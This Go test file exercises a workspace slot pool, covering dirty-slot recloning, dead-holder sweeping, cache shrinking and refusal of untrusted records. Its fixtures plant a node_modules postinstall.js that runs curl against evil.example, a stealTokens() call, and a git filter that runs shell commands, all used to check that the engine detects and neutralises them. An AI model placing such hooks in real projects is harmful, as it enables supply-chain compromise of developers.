package engine

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/sungurerdim/aiwe/internal/core"
)

// TestDirtySlotRecloned guards the verify of SPEC §6.5 and §6.5 Worktrees: a status line outside
// the KeepDirs allow-list, a linked worktree or a KeepDirs manifest that differs from the one
// recorded after the restore makes the slot dirty; it is removed and cloned again, and a lease never
// hands out a dirty slot. A directory the engine did not create is never removed (DR-11).
func TestDirtySlotRecloned(t *testing.T) {
	tests := []struct {
		name    string
		catches string
		dirty   func(t *testing.T, fx *slotTestFixture, s *Slot) string // returns a foreign path that must survive, or ""
		check   func(t *testing.T, fx *slotTestFixture, s *Slot)
	}{
		{
			name:    "a linked worktree makes the slot dirty; the worktree directory itself survives",
			catches: "a verify that ignores git worktree list, or a cleanup that deletes the run's worktree directory it did not create",
			dirty: func(t *testing.T, fx *slotTestFixture, s *Slot) string {
				wt := filepath.Join(fx.outside, "greeter-feature-wt")
				engineTestGit(t, s.Dir, "worktree", "add", "-q", "--detach", wt, fx.base)
				return filepath.Join(wt, "README.md")
			},
		},
		{
			name:    "a new file left in node_modules makes the slot dirty",
			catches: "a verify without the KeepDirs manifest, so a run plants code for the next run",
			dirty: func(t *testing.T, fx *slotTestFixture, s *Slot) string {
				engineTestWrite(t, filepath.Join(s.Dir, "node_modules", "left-pad", "postinstall.js"), "require('child_process').exec('curl evil.example')\n")
				return ""
			},
			check: func(t *testing.T, fx *slotTestFixture, s *Slot) {
				if slotTestExists(t, filepath.Join(s.Dir, "node_modules", "left-pad", "postinstall.js")) {
					t.Error("postinstall.js planted in node_modules reached the next lease")
				}
			},
		},
		{
			name:    "an edited file in node_modules makes the slot dirty",
			catches: "a manifest that lists paths only and misses a changed size or modification time",
			dirty: func(t *testing.T, fx *slotTestFixture, s *Slot) string {
				p := filepath.Join(s.Dir, filepath.FromSlash(slotTestInstalled))
				engineTestWrite(t, p, "module.exports = function leftPad() { stealTokens() }\n")
				later := slotTestEpoch().Add(time.Hour)
				if err := os.Chtimes(p, later, later); err != nil {
					t.Fatal(err)
				}
				return ""
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Logf("catches: %s", tt.catches)
			fx := slotTestSetup(t)
			p := fx.open(t, 1, newSlotTestQueue())
			s := fx.lease(t, p, fx.holder(slotTestSession, 4301), fx.base)
			sentinel := slotTestSentinel(t, s)
			foreign := tt.dirty(t, fx, s)
			fx.release(t, p, s)
			s2 := fx.lease(t, p, fx.holder(slotTestSecondSession, 4302), fx.base)
			slotTestAssertClean(t, s2, fx.base)
			if slotTestExists(t, sentinel) {
				t.Error("the dirty slot was handed out again instead of removed and cloned anew")
			}
			if got := engineTestRead(t, filepath.Join(s2.Dir, filepath.FromSlash(slotTestInstalled))); got != slotTestInstalledBody {
				t.Errorf("%s = %q in the recloned slot, want the restored file", slotTestInstalled, got)
			}
			if foreign != "" && !slotTestExists(t, foreign) {
				t.Errorf("%s, not made by the engine, was removed", foreign)
			}
			if tt.check != nil {
				tt.check(t, fx, s2)
			}
		})
	}

	t.Run("a restore that writes outside node_modules never hands the slot out", func(t *testing.T) {
		t.Logf("catches: a lease that hands out a slot whose verify still fails after a fresh clone")
		fx := slotTestSetup(t)
		t.Setenv(slotTestRestoreJunkEnv(), "1")
		p := fx.open(t, 1, newSlotTestQueue())
		ctx, cancel := context.WithTimeout(t.Context(), slotTestWait)
		defer cancel()
		s, err := p.Lease(ctx, fx.holder(slotTestSession, 4303), fx.base)
		if err == nil || s != nil {
			t.Fatalf("Lease = slot %v, err %v; want an error and no slot (.restore-cache/ is outside the allow-list)", s, err)
		}
		if slotTestExists(t, fx.leaseFile(1)) {
			t.Error("a failed lease left its lease file s1.lease behind")
		}
	})
}

// slotTestOverCache returns ceilings that only the cache footprint exceeds.
func slotTestOverCache() core.FootprintCeilings {
	c := core.DefaultFootprintCeilings()
	c.CacheBytes, c.CacheFiles = 0, 0
	return c
}

// TestSlotDeadHolderAndShrink guards the sweeper of SPEC §6.5 and the cleanup order of §6.4: a dead
// holder's lease (pid gone, or pid reused under another start time) is reaped and its slot reset
// and freed; a live holder's lease stays. A slot is removed only by the cleanup order, when the
// cache is over its ceiling, never by idle time alone (§15: idle-time shrink is deferred), and only
// through core.Owner.RemoveOwned: a directory the engine did not create survives (DR-11).
func TestSlotDeadHolderAndShrink(t *testing.T) {
	tests := []struct {
		name    string
		catches string
		run     func(t *testing.T, fx *slotTestFixture)
	}{
		{
			name:    "a dead holder's lease is swept and the slot is reset for the next holder",
			catches: "a pool that keeps a crashed session's slot leased forever, or frees it without a reset",
			run: func(t *testing.T, fx *slotTestFixture) {
				q := newSlotTestQueue()
				p := fx.open(t, 1, q)
				a := fx.lease(t, p, fx.holder(slotTestSession, 4401), fx.base)
				engineTestWrite(t, filepath.Join(a.Dir, "scratch", "session.log"), "crashed mid-run\n")
				fx.procs.kill(4401)
				reaped, err := p.Sweep(t.Context())
				if err != nil || reaped != 1 {
					t.Fatalf("Sweep = %d, %v; want 1 lease reaped", reaped, err)
				}
				if slotTestExists(t, fx.leaseFile(a.K)) {
					t.Error("the dead holder's lease file survived the sweep")
				}
				b := fx.lease(t, p, fx.holder(slotTestSecondSession, 4402), fx.base)
				if b.K != a.K || strings.Contains(q.String(), "queue position") {
					t.Errorf("next lease got slot %d (queue %q), want the swept slot %d at once", b.K, q.String(), a.K)
				}
				slotTestAssertClean(t, b, fx.base)
			},
		},
		{
			name:    "a pid reused under another start time is a dead holder",
			catches: "a liveness check by pid alone (F8)",
			run: func(t *testing.T, fx *slotTestFixture) {
				p := fx.open(t, 1, newSlotTestQueue())
				h := fx.holder(slotTestSession, 4401)
				fx.lease(t, p, h, fx.base)
				fx.procs.run(4401, h.Process.Start.Add(5*time.Minute))
				reaped, err := p.Sweep(t.Context())
				if err != nil || reaped != 1 {
					t.Fatalf("Sweep = %d, %v; want the lease of the reused pid reaped", reaped, err)
				}
			},
		},
		{
			name:    "a live holder's lease survives the sweep and the next lease queues",
			catches: "a sweeper that reaps a live session's slot",
			run: func(t *testing.T, fx *slotTestFixture) {
				q := newSlotTestQueue()
				p := fx.open(t, 1, q)
				fx.lease(t, p, fx.holder(slotTestSession, 4401), fx.base)
				fx.clock.Advance(3 * slotTestDay)
				reaped, err := p.Sweep(t.Context())
				if err != nil || reaped != 0 {
					t.Fatalf("Sweep = %d, %v; want nothing reaped", reaped, err)
				}
				if !slotTestExists(t, fx.leaseFile(1)) {
					t.Fatal("the live holder's lease file is gone")
				}
				ctx, cancel := context.WithTimeout(t.Context(), 250*time.Millisecond)
				defer cancel()
				s, err := p.Lease(ctx, fx.holder(slotTestSecondSession, 4402), fx.base)
				if s != nil || !errors.Is(err, context.DeadlineExceeded) {
					t.Errorf("Lease beside a live holder = slot %v, err %v; want it to wait until the deadline", s, err)
				}
				if !strings.Contains(q.String(), "queue position 1") {
					t.Errorf("waiting lease printed %q, want its queue position 1", q.String())
				}
			},
		},
		{
			name:    "a slot idle 15 days under the ceiling is kept",
			catches: "an idle-time rule that shrinks the pool, which SPEC §6.5 and §15 defer until measured",
			run: func(t *testing.T, fx *slotTestFixture) {
				p := fx.open(t, 1, newSlotTestQueue())
				a := fx.lease(t, p, fx.holder(slotTestSession, 4401), fx.base)
				sentinel := slotTestSentinel(t, a)
				fx.release(t, p, a)
				fx.clock.Advance(15 * slotTestDay)
				removed, err := p.Shrink(t.Context(), core.DefaultFootprintCeilings())
				if err != nil || removed != 0 {
					t.Fatalf("Shrink under the ceiling = %d, %v; want nothing removed", removed, err)
				}
				if !slotTestExists(t, sentinel) {
					t.Error("an idle slot under the ceiling was removed")
				}
			},
		},
		{
			name:    "over the cache ceiling an idle slot is removed and a later lease clones anew",
			catches: "a cleanup order that never frees idle slots, or a pool that hands out a removed slot",
			run: func(t *testing.T, fx *slotTestFixture) {
				p := fx.open(t, 1, newSlotTestQueue())
				a := fx.lease(t, p, fx.holder(slotTestSession, 4401), fx.base)
				fx.release(t, p, a)
				fx.clock.Advance(15 * slotTestDay)
				removed, err := p.Shrink(t.Context(), slotTestOverCache())
				if err != nil || removed != 1 {
					t.Fatalf("Shrink over the ceiling = %d, %v; want the idle slot removed", removed, err)
				}
				if slotTestExists(t, a.Root) {
					t.Errorf("idle slot root %q survived the cleanup", a.Root)
				}
				b := fx.lease(t, p, fx.holder(slotTestSecondSession, 4402), fx.base)
				slotTestAssertClean(t, b, fx.base)
			},
		},
		{
			name:    "over the cache ceiling a leased slot is kept",
			catches: "a cleanup that removes the slot a live run works in",
			run: func(t *testing.T, fx *slotTestFixture) {
				p := fx.open(t, 1, newSlotTestQueue())
				a := fx.lease(t, p, fx.holder(slotTestSession, 4401), fx.base)
				fx.clock.Advance(15 * slotTestDay)
				removed, err := p.Shrink(t.Context(), slotTestOverCache())
				if err != nil || removed != 0 {
					t.Fatalf("Shrink with only a leased slot = %d, %v; want nothing removed", removed, err)
				}
				if !slotTestExists(t, filepath.Join(a.Dir, "README.md")) {
					t.Error("the leased slot was removed")
				}
			},
		},
		{
			name:    "over the cache ceiling a directory the engine did not create survives",
			catches: "a cleanup that walks the cache root and deletes whatever looks idle (DR-11)",
			run: func(t *testing.T, fx *slotTestFixture) {
				foreign := filepath.Join(fx.roots.Cache, "backup-2026-09", "thesis.md")
				engineTestWrite(t, foreign, "# chapter 1\n")
				old := slotTestEpoch().Add(-30 * slotTestDay)
				for _, path := range []string{foreign, filepath.Dir(foreign)} {
					if err := os.Chtimes(path, old, old); err != nil {
						t.Fatal(err)
					}
				}
				p := fx.open(t, 1, newSlotTestQueue())
				a := fx.lease(t, p, fx.holder(slotTestSession, 4401), fx.base)
				fx.release(t, p, a)
				fx.clock.Advance(15 * slotTestDay)
				removed, err := p.Shrink(t.Context(), slotTestOverCache())
				if err != nil || removed != 1 {
					t.Fatalf("Shrink = %d, %v; want the one idle slot removed", removed, err)
				}
				if got := engineTestRead(t, foreign); got != "# chapter 1\n" {
					t.Errorf("foreign file = %q, want it untouched", got)
				}
			},
		},
		{
			name:    "a slot swapped for a foreign directory is refused with not_owned and survives",
			catches: "a removal outside core.Owner.RemoveOwned that trusts the recorded slot path (DR-11)",
			run: func(t *testing.T, fx *slotTestFixture) {
				p := fx.open(t, 1, newSlotTestQueue())
				a := fx.lease(t, p, fx.holder(slotTestSession, 4401), fx.base)
				fx.release(t, p, a)
				// The slot's directory is moved aside, never removed (DR-11), and a foreign one takes its name.
				if err := os.Rename(a.Root, a.Root+"-moved"); err != nil {
					t.Fatal(err)
				}
				thesis := filepath.Join(a.Root, "thesis.md")
				engineTestWrite(t, thesis, "# chapter 2\n")
				fx.clock.Advance(15 * slotTestDay)
				removed, err := p.Shrink(t.Context(), slotTestOverCache())
				if !errors.Is(err, core.ErrNotOwned) || removed != 0 {
					t.Errorf("Shrink over a swapped slot = %d, %v; want 0 removed and not_owned", removed, err)
				}
				if got := engineTestRead(t, thesis); got != "# chapter 2\n" {
					t.Errorf("foreign file in the swapped slot = %q, want it untouched", got)
				}
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Logf("catches: %s", tt.catches)
			tt.run(t, slotTestSetup(t))
		})
	}
}

// TestSlotUntrustedState guards the pool against state it cannot trust or use (SPEC §6.5, DR-10,
// DR-11): a record naming a place outside the cache root is refused and that place is never reset
// or cleaned; a filter planted in a slot's repository config never runs; a dirty slot of another
// pool is kept and skipped for a new slot; an empty queue ticket is no waiter ahead.
func TestSlotUntrustedState(t *testing.T) {
	for _, tc := range []struct {
		name   string
		record func(victim string) string
	}{
		{"an absolute root outside the cache root", func(v string) string {
			return `{"root":` + strconv.Quote(v) + `,"dir":` + strconv.Quote(filepath.Join(v, cloneDirName)) + `}`
		}},
		{"a slot name that climbs out of the cache root", func(v string) string {
			return `{"name":` + strconv.Quote("../"+filepath.Base(v)) + `}`
		}},
	} {
		t.Run("a record naming "+tc.name+" is refused, never reset", func(t *testing.T) {
			t.Logf("catches: a lease that trusts a recorded path and cleans a user repository (P1, DR-11)")
			fx := slotTestSetup(t)
			victim, repo, head := slotTestVictim(t, fx)
			p := fx.open(t, 1, newSlotTestQueue())
			fx.release(t, p, fx.lease(t, p, fx.holder(slotTestSession, 4701), fx.base))
			engineTestWrite(t, filepath.Join(fx.leaseDir, "s1.slot"), tc.record(victim))
			ctx, cancel := context.WithTimeout(t.Context(), slotTestWait)
			defer cancel()
			if s, err := p.Lease(ctx, fx.holder(slotTestSecondSession, 4702), fx.base); err == nil || s != nil {
				t.Errorf("Lease over a record naming %s = slot %v, err %v; want an error", victim, s, err)
			}
			slotTestVictimIntact(t, repo, head)
		})
	}

	t.Run("a filter planted in the slot's repository config never runs", func(t *testing.T) {
		t.Logf("catches: an engine git call in a slot with repository-configured programs on (P2, DR-10)")
		fx := slotTestSetup(t)
		p := fx.open(t, 1, newSlotTestQueue())
		a := fx.lease(t, p, fx.holder(slotTestSession, 4703), fx.base)
		marker := filepath.Join(fx.outside, "filter-ran.txt")
		cmd := "echo ran >> '" + filepath.ToSlash(marker) + "'; cat"
		engineTestGit(t, a.Dir, "config", "filter.planted.smudge", cmd)
		engineTestGit(t, a.Dir, "config", "filter.planted.clean", cmd)
		engineTestWrite(t, filepath.Join(engineTestGit(t, a.Dir, "rev-parse", "--absolute-git-dir"), "info", "attributes"), "* filter=planted\n")
		engineTestWrite(t, filepath.Join(a.Dir, "README.md"), "# greeter\n\nedited by the run\n")
		fx.release(t, p, a)
		fx.lease(t, p, fx.holder(slotTestSecondSession, 4704), fx.base)
		if slotTestExists(t, marker) {
			t.Errorf("the planted filter ran: %q", engineTestRead(t, marker))
		}
	})

	t.Run("a dirty slot of another pool is kept and skipped for a new slot", func(t *testing.T) {
		t.Logf("catches: a pool that fails every lease on one slot it cannot remove (B2, P3)")
		fx := slotTestSetup(t)
		p1 := fx.open(t, 2, newSlotTestQueue())
		a := fx.lease(t, p1, fx.holder(slotTestSession, 4705), fx.base)
		planted := filepath.Join(a.Dir, "node_modules", "left-pad", "postinstall.js")
		engineTestWrite(t, planted, "require('child_process')\n")
		fx.release(t, p1, a)
		b := fx.lease(t, fx.open(t, 2, newSlotTestQueue()), fx.holder(slotTestSecondSession, 4706), fx.base)
		if b.K == a.K || b.Dir == a.Dir {
			t.Errorf("lease got the dirty slot %d at %q, want another slot", b.K, b.Dir)
		}
		slotTestAssertClean(t, b, fx.base)
		if !slotTestExists(t, planted) {
			t.Error("a pool removed a slot another process created (DR-11)")
		}
		if slotTestExists(t, fx.leaseFile(a.K)) {
			t.Errorf("the skipped slot %d kept a lease file", a.K)
		}
	})

	t.Run("an empty queue ticket is no waiter ahead", func(t *testing.T) {
		t.Logf("catches: a half-written ticket that blocks the queue until the deadline (B4)")
		fx := slotTestSetup(t)
		engineTestWrite(t, filepath.Join(fx.leaseDir, "w1.wait"), "")
		q := newSlotTestQueue()
		fx.lease(t, fx.open(t, 1, q), fx.holder(slotTestSession, 4707), fx.base)
		if strings.Contains(q.String(), "queue position") {
			t.Errorf("a lease with every slot free printed %q", q.String())
		}
	})
}

// TestSlotDefaultLiveness guards the liveness check a pool uses when the spec names none: a holder
// with this process's pid and another start time is dead, so its lease is reaped (F8); a holder
// with this process's pid and start time is alive.
func TestSlotDefaultLiveness(t *testing.T) {
	self, err := core.CurrentProcess()
	if err != nil {
		t.Fatal(err)
	}
	// A dead holder differs from self in the start time and, where the OS gives one, the identity.
	otherID := ""
	if self.StartID() != "" {
		otherID = self.StartID() + "-other"
	}
	for _, tc := range []struct {
		name   string
		holder core.ProcessID
		reaped int
	}{
		{"this pid under another start time is a dead holder", core.ProcessFrom(self.PID, self.Start.Add(-time.Hour), otherID), 1},
		{"this pid under its own start time is a live holder", self, 0},
	} {
		t.Run(tc.name, func(t *testing.T) {
			fx := slotTestSetup(t)
			spec := fx.spec(1, newSlotTestQueue())
			spec.Alive = nil
			p, err := OpenSlotPool(spec)
			if err != nil {
				t.Fatal(err)
			}
			fx.lease(t, p, SlotHolder{Session: slotTestSession, Process: tc.holder}, fx.base)
			if reaped, err := p.Sweep(t.Context()); err != nil || reaped != tc.reaped {
				t.Errorf("Sweep = %d, %v; want %d reaped", reaped, err, tc.reaped)
			}
		})
	}
}

// TestSlotErrorPaths guards the error returns no other row reaches: a restore that exits non-zero,
// a queue output that fails, a lease file that does not parse (kept, no error) and a footprint that
// cannot be measured. None leaves a lease file or removes a slot (fail-closed, DR-11).
func TestSlotErrorPaths(t *testing.T) {
	t.Run("a restore that exits non-zero fails the lease", func(t *testing.T) {
		fx := slotTestSetup(t)
		spec := fx.spec(1, newSlotTestQueue())
		spec.Restore = append(spec.Restore, "-test.count=not-a-number")
		p, err := OpenSlotPool(spec)
		if err != nil {
			t.Fatal(err)
		}
		ctx, cancel := context.WithTimeout(t.Context(), slotTestWait)
		defer cancel()
		if s, err := p.Lease(ctx, fx.holder(slotTestSession, 4801), fx.base); err == nil || s != nil {
			t.Errorf("Lease with a failing restore = slot %v, err %v; want an error", s, err)
		}
		if slotTestExists(t, fx.leaseFile(1)) {
			t.Error("a lease whose restore failed left s1.lease behind")
		}
	})
	t.Run("a queue output that fails ends the wait with its error", func(t *testing.T) {
		fx := slotTestSetup(t)
		fx.lease(t, fx.open(t, 1, newSlotTestQueue()), fx.holder(slotTestSession, 4802), fx.base)
		spec := fx.spec(1, nil)
		spec.Queue = slotTestBrokenQueue{}
		p, err := OpenSlotPool(spec)
		if err != nil {
			t.Fatal(err)
		}
		ctx, cancel := context.WithTimeout(t.Context(), slotTestWait)
		defer cancel()
		if s, err := p.Lease(ctx, fx.holder(slotTestSecondSession, 4803), fx.base); s != nil || err == nil || errors.Is(err, context.DeadlineExceeded) {
			t.Errorf("Lease with a failing queue output = slot %v, err %v; want the write error", s, err)
		}
	})
	t.Run("a lease file that does not parse is kept by the sweep", func(t *testing.T) {
		fx := slotTestSetup(t)
		engineTestWrite(t, fx.leaseFile(1), "")
		if reaped, err := fx.open(t, 1, newSlotTestQueue()).Sweep(t.Context()); err != nil || reaped != 0 {
			t.Errorf("Sweep over an empty lease file = %d, %v; want 0 and no error", reaped, err)
		}
		if !slotTestExists(t, fx.leaseFile(1)) {
			t.Error("the sweep removed a lease file it could not read as dead")
		}
	})
	t.Run("catches: a lease file a crash left unparsable that locks its slot forever", func(t *testing.T) {
		fx := slotTestSetup(t)
		engineTestWrite(t, fx.leaseFile(1), "")
		old := time.Now().Add(-time.Hour)
		if err := os.Chtimes(fx.leaseFile(1), old, old); err != nil {
			t.Fatal(err)
		}
		if reaped, err := fx.open(t, 1, newSlotTestQueue()).Sweep(t.Context()); err != nil || reaped != 1 {
			t.Errorf("Sweep over a stale unparsable lease file = %d, %v; want it reaped", reaped, err)
		}
	})
	t.Run("a footprint that cannot be measured fails the shrink", func(t *testing.T) {
		fx := slotTestSetup(t)
		p := fx.open(t, 1, newSlotTestQueue())
		a := fx.lease(t, p, fx.holder(slotTestSession, 4804), fx.base)
		fx.release(t, p, a)
		ctx, cancel := context.WithCancel(t.Context())
		cancel()
		if removed, err := p.Shrink(ctx, slotTestOverCache()); err == nil || removed != 0 {
			t.Errorf("Shrink without a footprint = %d, %v; want 0 and an error", removed, err)
		}
		if !slotTestExists(t, a.Root) {
			t.Error("a shrink without a footprint removed the slot")
		}
	})
}
